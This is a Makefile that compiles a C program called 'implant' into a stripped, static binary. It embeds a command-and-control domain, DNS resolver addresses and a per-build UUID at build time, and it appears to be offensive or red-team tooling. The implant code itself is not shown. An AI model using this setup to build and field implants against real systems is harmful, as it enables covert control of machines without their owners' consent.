include .env

DNS_1_HEX = $(shell bash build/ip2hex.sh $(DNS_SERVER_1))
DNS_2_HEX = $(shell bash build/ip2hex.sh $(DNS_SERVER_2))
UUID      = $(shell uuidgen | tr -d '-')

CC = musl-gcc
CFLAGS      = -Wall -Os -fno-asynchronous-unwind-tables -fno-ident -fomit-frame-pointer -ffunction-sections -fdata-sections -flto
LDFLAGS     = -static -s -Wl,--gc-sections -Wl,--as-needed -Wl,-z,norelro
CFLAGS_DEV  = -Wall -ggdb -O0
LDFLAGS_DEV = -static -Wl,--as-needed -Wl,-z,norelro
TARGET = implant

.DEFAULT_GOAL = $(TARGET)

dev: CFLAGS = $(CFLAGS_DEV)
dev: LDFLAGS = $(LDFLAGS_DEV)
dev: implant.c
	$(CC) $(CFLAGS) $(LDFLAGS) -o $(TARGET) -DDNS_SERVER_1_ADDR=$(DNS_1_HEX) -DDNS_SERVER_2_ADDR=$(DNS_2_HEX) -DC2_DOMAIN=\"$(C2_DOMAIN)\" -DUUID=\"$(UUID)\" $<

$(TARGET): implant.c
	$(CC) $(CFLAGS) $(LDFLAGS) -DDNS_SERVER_1_ADDR=$(DNS_1_HEX) -DDNS_SERVER_2_ADDR=$(DNS_2_HEX) -DC2_DOMAIN=\"$(C2_DOMAIN)\" -DUUID=\"$(UUID)\" -o $(TARGET) $<
	strip --strip-all -R .comment -R .note.* $(TARGET)

clean:
	rm -f $(TARGET)

.PHONY: clean dev